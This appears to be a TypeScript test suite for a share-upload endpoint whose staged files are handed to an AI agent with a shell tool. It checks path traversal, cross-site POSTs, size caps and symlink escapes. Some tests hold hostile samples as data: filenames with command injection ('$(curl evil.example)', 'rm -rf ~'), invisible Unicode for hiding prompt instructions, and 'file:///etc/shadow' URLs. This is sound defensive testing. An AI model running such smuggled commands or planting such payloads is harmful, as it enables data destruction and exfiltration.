import { afterEach, beforeEach, describe, expect, test } from "bun:test";
import { mkdir, mkdtemp, readdir, readFile, rm, symlink, utimes, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import {
  SHARE_STAGING_DIR,
} from "@schlessera/brain-ui-sdk/protocol";
import { createShareRoutes } from "../src/routes/share";
import {
  ShareTooLargeError,
  pruneShareStaging,
  sanitizeFileName,
  shareStagingRoot,
  stageShare,
} from "../src/share/staging";
import { PathEscapeError } from "../src/files/walker";

const BRAIN_ROOT = `/tmp/brain-ui-share-${process.pid}`;

const shareRoutes = createShareRoutes({
  brainRoot: BRAIN_ROOT,
  allowedOrigins: [],
  trustProxy: false,
});

beforeEach(async () => {
  await rm(BRAIN_ROOT, { recursive: true, force: true });
  await mkdir(BRAIN_ROOT, { recursive: true });
});

afterEach(async () => {
  await rm(BRAIN_ROOT, { recursive: true, force: true });
});

function post(form: FormData) {
  return shareRoutes.request("/share", { method: "POST", body: form });
}

function textFile(name: string, body: string, type = "text/plain"): File {
  return new File([body], name, { type });
}

async function readManifest(dir: string) {
  return JSON.parse(
    await readFile(join(BRAIN_ROOT, dir, "meta.json"), "utf-8")
  ) as Record<string, unknown>;
}

describe("POST /api/share", () => {
  test("stages a text + url share and writes meta.json", async () => {
    const form = new FormData();
    form.set("title", "A page");
    form.set("text", "Something worth keeping");
    form.set("url", "https://example.com/post");

    const response = await post(form);
    const body = await response.json();

    expect(response.status).toBe(201);
    expect(body.dir.startsWith(`${SHARE_STAGING_DIR}/`)).toBe(true);
    expect(body.files).toEqual([]);
    expect(body.title).toBe("A page");
    expect(body.url).toBe("https://example.com/post");
    // The manifest carries the provenance; the HTTP answer has no use for it.
    expect(body.source).toBeUndefined();

    const manifest = await readManifest(body.dir);
    expect(manifest.source).toBe("web-share-target");
    expect(manifest.text).toBe("Something worth keeping");
    expect(manifest.id).toBe(body.id);
  });

  test("stages files under the staging dir with their bytes intact", async () => {
    const form = new FormData();
    form.append("files", textFile("notes.md", "# hello", "text/markdown"));

    const response = await post(form);
    const body = await response.json();

    expect(response.status).toBe(201);
    expect(body.files).toHaveLength(1);
    expect(body.files[0]).toMatchObject({
      name: "notes.md",
      mediaType: "text/markdown",
      bytes: 7,
      path: `${body.dir}/notes.md`,
    });
    expect(await readFile(join(BRAIN_ROOT, body.files[0].path), "utf-8")).toBe(
      "# hello"
    );
  });

  test("a traversing file name cannot leave the staging dir", async () => {
    const form = new FormData();
    form.append("files", textFile("../../../etc/passwd", "nope"));

    const body = await (await post(form)).json();

    expect(body.files[0].name).toBe("passwd");
    expect(body.files[0].path).toBe(`${body.dir}/passwd`);
    const staged = await readdir(join(BRAIN_ROOT, body.dir));
    expect(staged.sort()).toEqual(["meta.json", "passwd"]);
  });

  test("a shared file called meta.json does not clobber the manifest", async () => {
    const form = new FormData();
    form.append("files", textFile("meta.json", '{"evil":true}', "application/json"));

    const body = await (await post(form)).json();

    expect(body.files[0].name).toBe("meta-2.json");
    const manifest = await readManifest(body.dir);
    expect(manifest.source).toBe("web-share-target");
  });

  test("a differently-cased meta.json is still kept off the manifest", async () => {
    // On a case-insensitive filesystem (macOS, Windows) META.JSON and meta.json
    // are one file: a case-sensitive reservation would let one overwrite the
    // other and leave the manifest describing a file that no longer exists.
    const form = new FormData();
    form.append("files", textFile("META.JSON", '{"evil":true}', "application/json"));
    form.append("files", textFile("Photo.JPG", "one", "image/jpeg"));
    form.append("files", textFile("photo.jpg", "two", "image/jpeg"));

    const body = await (await post(form)).json();

    const names = body.files.map((f: { name: string }) => f.name);
    // The extension is normalized to lower case; the stem keeps its casing.
    expect(names[0]).toBe("META-2.json");
    expect(new Set(names.map((n: string) => n.toLowerCase())).size).toBe(3);
  });

  test("colliding names are suffixed rather than overwritten", async () => {
    const form = new FormData();
    form.append("files", textFile("photo.jpg", "one", "image/jpeg"));
    form.append("files", textFile("photo.jpg", "two", "image/jpeg"));

    const body = await (await post(form)).json();

    expect(body.files.map((f: { name: string }) => f.name)).toEqual([
      "photo.jpg",
      "photo-2.jpg",
    ]);
    expect(await readFile(join(BRAIN_ROOT, body.files[1].path), "utf-8")).toBe(
      "two"
    );
  });

  test("empty parts are ignored, and a share with nothing in it is refused", async () => {
    const form = new FormData();
    form.append("files", new File([], "empty.txt", { type: "text/plain" }));

    const response = await post(form);

    expect(response.status).toBe(400);
    expect(await response.json()).toEqual({ error: "empty_share" });
  });

  test("too many files is refused with the limit", async () => {
    const form = new FormData();
    for (let n = 0; n <= 10; n += 1) {
      form.append("files", textFile(`f${n}.txt`, "x"));
    }

    const response = await post(form);

    expect(response.status).toBe(413);
    expect(await response.json()).toEqual({
      error: "too_many_files",
      limit: 10,
    });
  });

  test("oversize text is refused before anything is written", async () => {
    const form = new FormData();
    form.set("text", "x".repeat(200_000 + 1));

    const response = await post(form);

    expect(response.status).toBe(413);
    expect(await response.json()).toEqual({
      error: "text_too_large",
      limit: 200_000,
    });
    await expect(readdir(shareStagingRoot(BRAIN_ROOT))).rejects.toThrow();
  });

  test("a body with no content-length is still capped while streaming", async () => {
    // Chunked / HTTP2 requests carry no content-length, so the header check is
    // not a defense: the cap has to be counted off the stream.
    const megabyte = new Uint8Array(1024 * 1024);
    let sent = 0;
    const body = new ReadableStream<Uint8Array>({
      pull(controller) {
        if (sent >= 60) {
          controller.close();
          return;
        }
        sent += 1;
        controller.enqueue(megabyte);
      },
    });

    const response = await shareRoutes.request("/share", {
      method: "POST",
      headers: { "content-type": "multipart/form-data; boundary=abc" },
      body,
      // @ts-expect-error -- required by fetch for a streamed body, absent from the DOM types
      duplex: "half",
    });

    expect(response.status).toBe(413);
    expect((await response.json()).error).toBe("share_too_large");
    // The stream was abandoned, not drained.
    expect(sent).toBeLessThan(60);
  });

  test("a cross-site POST is refused even with a valid session", async () => {
    // A multipart POST is CORS-simple, so it arrives with no preflight, and in
    // tailscale mode the credential is the source IP rather than a cookie.
    // Only the app itself ever calls this route.
    const form = new FormData();
    form.set("text", "injected");

    const response = await shareRoutes.request("/share", {
      method: "POST",
      headers: { "sec-fetch-site": "cross-site" },
      body: form,
    });

    expect(response.status).toBe(403);
    expect((await response.json()).error).toBe("cross_origin_rejected");
    await expect(readdir(shareStagingRoot(BRAIN_ROOT))).rejects.toThrow();
  });

  test("a same-origin POST from the app is accepted", async () => {
    const form = new FormData();
    form.set("text", "from the app");

    const response = await shareRoutes.request("/share", {
      method: "POST",
      headers: { "sec-fetch-site": "same-origin" },
      body: form,
    });

    expect(response.status).toBe(201);
  });

  test("a declared content-length over the cap is refused before parsing", async () => {
    const response = await shareRoutes.request("/share", {
      method: "POST",
      headers: { "content-length": String(10 ** 9) },
      body: new FormData(),
    });

    expect(response.status).toBe(413);
    expect((await response.json()).error).toBe("share_too_large");
  });

  test("counts overlapping uploads before their first body-read await", async () => {
    const boundary = "brain-ui-concurrency-boundary";
    const encoded = new TextEncoder().encode(
      `--${boundary}\r\n` +
        'Content-Disposition: form-data; name="text"\r\n\r\n' +
        "overlapping upload\r\n" +
        `--${boundary}--\r\n`
    );

    function stalledUpload() {
      let markStarted!: () => void;
      let release!: () => void;
      const started = new Promise<void>((resolve) => {
        markStarted = resolve;
      });
      const released = new Promise<void>((resolve) => {
        release = resolve;
      });
      let pulled = false;
      const body = new ReadableStream<Uint8Array>({
        async pull(controller) {
          if (pulled) return;
          pulled = true;
          markStarted();
          await released;
          controller.enqueue(encoded);
          controller.close();
        },
      });
      const response = shareRoutes.request("/share", {
        method: "POST",
        headers: { "content-type": `multipart/form-data; boundary=${boundary}` },
        body,
        // @ts-expect-error -- required by fetch for a streamed body, absent from the DOM types
        duplex: "half",
      });
      return { response, started, release };
    }

    // The first two intakes are deliberately held inside readCappedBody(). If
    // reservations happen before that await, both already consume capacity.
    const first = stalledUpload();
    const second = stalledUpload();
    await Promise.all([first.started, second.started]);

    // Fill the one remaining slot, then verify the next request is refused
    // without reading or parsing its body.
    const third = stalledUpload();
    await third.started;
    const fourth = new FormData();
    fourth.set("text", "must be refused while the other uploads are stalled");

    try {
      const response = await post(fourth);
      expect(response.status).toBe(503);
      expect(await response.json()).toEqual({ error: "busy" });
    } finally {
      first.release();
      second.release();
      third.release();
      const responses = await Promise.all([
        first.response,
        second.response,
        third.response,
      ]);
      expect(responses.map((response) => response.status)).toEqual([201, 201, 201]);
    }
  });
});

describe("share staging", () => {
  test("accepts brain roots reached through direct and ancestor symlinks", async () => {
    const sandbox = await mkdtemp(join(tmpdir(), "brain-share-linked-root-"));
    const directRoot = join(sandbox, "direct-root");
    const directLink = join(sandbox, "direct-link");
    const nestedParent = join(sandbox, "nested-parent");
    const nestedRoot = join(nestedParent, "brain");
    const nestedParentLink = join(sandbox, "nested-parent-link");

    try {
      await mkdir(directRoot);
      await symlink(directRoot, directLink, "dir");
      await mkdir(nestedRoot, { recursive: true });
      await symlink(nestedParent, nestedParentLink, "dir");

      for (const brainRoot of [directLink, join(nestedParentLink, "brain")]) {
        const result = await stageShare(
          brainRoot,
          { text: "root symlinks are trusted", files: [] }
        );
        await expect(readFile(join(brainRoot, result.dir, "meta.json"), "utf-8")).resolves.toContain(
          "root symlinks are trusted"
        );
      }
    } finally {
      await rm(sandbox, { recursive: true, force: true });
    }
  });

  test("refuses an inbox symlink that escapes the brain root", async () => {
    const brainRoot = await mkdtemp(join(tmpdir(), "brain-share-root-"));
    const outsideRoot = await mkdtemp(join(tmpdir(), "brain-share-outside-"));

    try {
      await mkdir(join(brainRoot, ".brain-ui"));
      await symlink(outsideRoot, shareStagingRoot(brainRoot), "dir");

      await expect(
        stageShare(brainRoot, { text: "must stay inside", files: [] })
      ).rejects.toBeInstanceOf(PathEscapeError);
      expect(await readdir(outsideRoot)).toEqual([]);
    } finally {
      await rm(brainRoot, { recursive: true, force: true });
      await rm(outsideRoot, { recursive: true, force: true });
    }
  });

  test("refuses a dangling inbox symlink as a containment failure", async () => {
    const brainRoot = await mkdtemp(join(tmpdir(), "brain-share-root-"));
    const outsideRoot = await mkdtemp(join(tmpdir(), "brain-share-outside-"));
    const missingTarget = join(outsideRoot, "missing-inbox");

    try {
      await mkdir(join(brainRoot, ".brain-ui"));
      await symlink(missingTarget, shareStagingRoot(brainRoot), "dir");

      await expect(
        stageShare(brainRoot, { text: "must fail closed", files: [] })
      ).rejects.toBeInstanceOf(PathEscapeError);
      expect(await readdir(outsideRoot)).toEqual([]);
    } finally {
      await rm(brainRoot, { recursive: true, force: true });
      await rm(outsideRoot, { recursive: true, force: true });
    }
  });

  test("sanitizeFileName strips control characters and separators", () => {
    expect(sanitizeFileName("pho\u0000to:1.jpg", "image/jpeg")).toBe("photo-1.jpg");
    expect(sanitizeFileName("dir/sub\\shot.PNG", "image/png")).toBe("shot.png");
    expect(sanitizeFileName("", "application/pdf")).toBe("file.pdf");
    expect(sanitizeFileName("...", "text/plain")).toBe("file.txt");
  });

  test("no shell metacharacter survives a file name", () => {
    // The consumer is an agent with a Bash tool. Correct quoting by the agent
    // is not a security boundary, so the name it is handed must be inert.
    const hostile = [
      "x$(curl evil.example).jpg",
      "`whoami`.txt",
      "a;rm -rf ~.txt",
      "a|b>c<d&e.png",
      "'quoted' \"double\".pdf",
      "new\nline.txt",
    ];
    for (const raw of hostile) {
      const name = sanitizeFileName(raw, "text/plain");
      expect(name).toMatch(/^[\p{L}\p{N}\p{M}._-]+$/u);
      expect(name.startsWith("-")).toBe(false);
      expect(name.startsWith(".")).toBe(false);
    }
  });

  test("invisible characters cannot ride in on a name or on text", () => {
    // Bidi overrides, zero-width characters and the Unicode tag block are the
    // standard channel for hiding instructions from a human while leaving them
    // in the model's tokens.
    const rlo = "photo" + "\u202E" + "gnp.exe";
    const tagged = "note" + "\u200B" + "s" + "\u{E0041}" + ".txt";
    expect(sanitizeFileName(rlo, "image/png")).toBe("photognp.exe");
    expect(sanitizeFileName(tagged, "text/plain")).toBe("notes.txt");
  });

  test("a name that is only forbidden characters still becomes a file", () => {
    expect(sanitizeFileName("$$$", "image/jpeg")).toBe("file.jpg");
    expect(sanitizeFileName("-----", "text/plain")).toBe("file.txt");
  });

  test("a CJK name survives as itself", () => {
    // The allowlist keeps Unicode letters: sanitizing must not mean ASCII-only.
    expect(sanitizeFileName("\u8a18\u4e8b.md", "text/markdown")).toBe("\u8a18\u4e8b.md");
  });

  test("a leading dot cannot make a staged file hidden", () => {
    expect(sanitizeFileName(".env", "text/plain")).toBe("env.txt");
  });

  test("an extensionless name takes its extension from the media type", () => {
    expect(sanitizeFileName("scan", "application/pdf")).toBe("scan.pdf");
    expect(sanitizeFileName("blob", "application/x-thing")).toBe("blob");
  });

  test("a long name is bounded by BYTES and keeps its extension", () => {
    const ascii = sanitizeFileName(`${"a".repeat(400)}.jpg`, "image/jpeg");
    expect(Buffer.byteLength(ascii, "utf-8")).toBeLessThanOrEqual(100);
    expect(ascii.endsWith(".jpg")).toBe(true);

    // Three bytes per character: counting characters would produce a name the
    // filesystem refuses with ENAMETOOLONG.
    const cjk = sanitizeFileName(`${"\u8a18".repeat(200)}.jpg`, "image/jpeg");
    expect(Buffer.byteLength(cjk, "utf-8")).toBeLessThanOrEqual(100);
    expect(cjk.endsWith(".jpg")).toBe(true);

    // And no surrogate pair is cut in half.
    const emoji = sanitizeFileName(`${"\u{1f4a1}".repeat(100)}.png`, "image/png");
    expect(Buffer.byteLength(emoji, "utf-8")).toBeLessThanOrEqual(100);
    expect(emoji.includes("\ufffd")).toBe(false);
  });

  test("a part that lies about its size is caught on the decoded bytes", async () => {
    const oversized = new Uint8Array(25_000_000 + 1);
    const liar = {
      name: "small.bin",
      type: "application/octet-stream",
      size: 12,
      arrayBuffer: async () => oversized.buffer,
    } as unknown as File;

    await expect(stageShare(BRAIN_ROOT, { files: [liar] })).rejects.toBeInstanceOf(
      ShareTooLargeError
    );
    // The half-written directory is removed, not left for the agent to read.
    await expect(readdir(shareStagingRoot(BRAIN_ROOT))).resolves.toEqual([]);
  });

  test("a share is only visible once it is whole", async () => {
    // Staged into `.<id>.partial` and renamed into place after meta.json, so a
    // crash mid-write cannot leave the agent a share with missing files.
    let release!: () => void, started!: () => void;
    const held = new Promise<void>((resolve) => { release = resolve; });
    const reading = new Promise<void>((resolve) => { started = resolve; });
    const file = {
      name: "harbor.txt", type: "text/plain", size: 1,
      arrayBuffer: async () => { started(); await held; return new Uint8Array([120]).buffer; },
    } as unknown as File;
    const staging = stageShare(BRAIN_ROOT, { text: "atomic", files: [file] });
    try {
      await reading;
      const incomplete = await readdir(shareStagingRoot(BRAIN_ROOT));
      expect(incomplete).toHaveLength(1);
      expect(incomplete[0]).toMatch(/^\.[a-f0-9-]{36}\.partial$/);
    } finally { release(); await staging; }
    const result = await staging;
    const entries = await readdir(shareStagingRoot(BRAIN_ROOT));
    expect(await readFile(join(BRAIN_ROOT, result.files[0]!.path), "utf8")).toBe("x");

    expect(entries).toEqual([result.id]);
    expect(entries.some((e) => e.includes("partial"))).toBe(false);
  });

  test("a url the agent must not dereference is demoted to text", async () => {
    // The filing skill fetches this field. Anything but http(s) — javascript:,
    // data:, file:///etc/shadow, the cloud metadata address over a bogus scheme
    // — becomes plain text instead.
    for (const hostile of ["javascript:alert(1)", "file:///etc/shadow", "data:text/html,x"]) {
      const result = await stageShare(BRAIN_ROOT, { url: hostile, files: [] });
      expect(result.url).toBeUndefined();
      expect(result.text).toContain(hostile);
    }

    const ok = await stageShare(BRAIN_ROOT, { url: "https://example.com/post", files: [] });
    expect(ok.url).toBe("https://example.com/post");
  });

  test("an absurd media type is replaced, not quoted back", async () => {
    // It is interpolated into the agent's prompt beside the file name, so an
    // unbounded attacker string there is a place to hide a paragraph.
    const file = new File(["x"], "note.txt", { type: "text/plain" });
    Object.defineProperty(file, "type", { value: "a/".padEnd(505, "b") });

    const result = await stageShare(BRAIN_ROOT, { files: [file] });

    expect(result.files[0]!.mediaType).toBe("application/octet-stream");
  });

  test("the inbox refuses to grow without bound", async () => {
    for (let n = 0; n < 50; n += 1) {
      await mkdir(join(shareStagingRoot(BRAIN_ROOT), `share-${n}`), { recursive: true });
    }

    await expect(stageShare(BRAIN_ROOT, { text: "one too many", files: [] })).rejects.toMatchObject({
      reason: "inbox_full",
    });
  });

  test("the total-size cap is enforced across files, not just per file", async () => {
    // Each part is under the per-file cap; together they are over the share cap.
    const chunk = new Uint8Array(8);
    const liar = (name: string) =>
      ({
        name,
        type: "application/octet-stream",
        size: 20_000_000,
        arrayBuffer: async () => chunk.buffer,
      }) as unknown as File;

    await expect(
      stageShare(BRAIN_ROOT, { files: [liar("a.bin"), liar("b.bin"), liar("c.bin")] })
    ).rejects.toMatchObject({ reason: "share_too_large" });
  });

  test("pruning refuses external and internal symlinked staging roots", async () => {
    const outside = await mkdtemp(join(tmpdir(), "brain-share-prune-"));
    try {
      for (const target of [outside, join(BRAIN_ROOT, "notes")]) {
        await mkdir(join(target, "valuable"), { recursive: true });
        await writeFile(join(target, "valuable/keep.txt"), "preserve");
        await mkdir(join(BRAIN_ROOT, ".brain-ui"), { recursive: true });
        await symlink(target, shareStagingRoot(BRAIN_ROOT));
        expect(await pruneShareStaging(BRAIN_ROOT, Date.now() + 365 * 86400000)).toBe(0);
        expect(await readFile(join(target, "valuable/keep.txt"), "utf8")).toBe("preserve");
        await rm(shareStagingRoot(BRAIN_ROOT));
      }
    } finally { await rm(outside, { recursive: true, force: true }); }
  });

  test("pruning accepts a symlinked brain root and preserves symlinked children", async () => {
    const holder = await mkdtemp(join(tmpdir(), "brain-share-prune-"));
    try {
      const link = join(holder, "brain");
      await symlink(BRAIN_ROOT, link);
      await stageShare(BRAIN_ROOT, { text: "expired share", files: [] });
      await mkdir(join(holder, "valuable"));
      await writeFile(join(holder, "valuable/keep.txt"), "preserve");
      await symlink(join(holder, "valuable"), join(shareStagingRoot(BRAIN_ROOT), "linked"));
      expect(await pruneShareStaging(link, Date.now() + 365 * 86400000)).toBe(1);
      expect(await readFile(join(holder, "valuable/keep.txt"), "utf8")).toBe("preserve");
    } finally { await rm(holder, { recursive: true, force: true }); }
  });

  test("pruneShareStaging sweeps orphaned partial directories sooner", async () => {
    const partial = join(shareStagingRoot(BRAIN_ROOT), ".abc.partial");
    await mkdir(partial, { recursive: true });
    const anHourAgo = new Date(Date.now() - 2 * 60 * 60 * 1000);
    await utimes(partial, anHourAgo, anHourAgo);

    expect(await pruneShareStaging(BRAIN_ROOT)).toBe(1);
    expect(await readdir(shareStagingRoot(BRAIN_ROOT))).toEqual([]);
  });

  test("pruneShareStaging removes expired shares and keeps fresh ones", async () => {
    const fresh = await stageShare(BRAIN_ROOT, { text: "keep me", files: [] });
    const stale = await stageShare(BRAIN_ROOT, { text: "sweep me", files: [] });

    const staleDir = join(BRAIN_ROOT, stale.dir);
    const expired = new Date(Date.now() - 7 * 24 * 60 * 60 * 1000 - 60_000);
    await utimes(staleDir, expired, expired);

    expect(await pruneShareStaging(BRAIN_ROOT)).toBe(1);
    expect(await readdir(shareStagingRoot(BRAIN_ROOT))).toEqual([fresh.id]);
  });

  test("pruneShareStaging is a no-op when nothing has been staged", async () => {
    expect(await pruneShareStaging(BRAIN_ROOT)).toBe(0);
  });
});
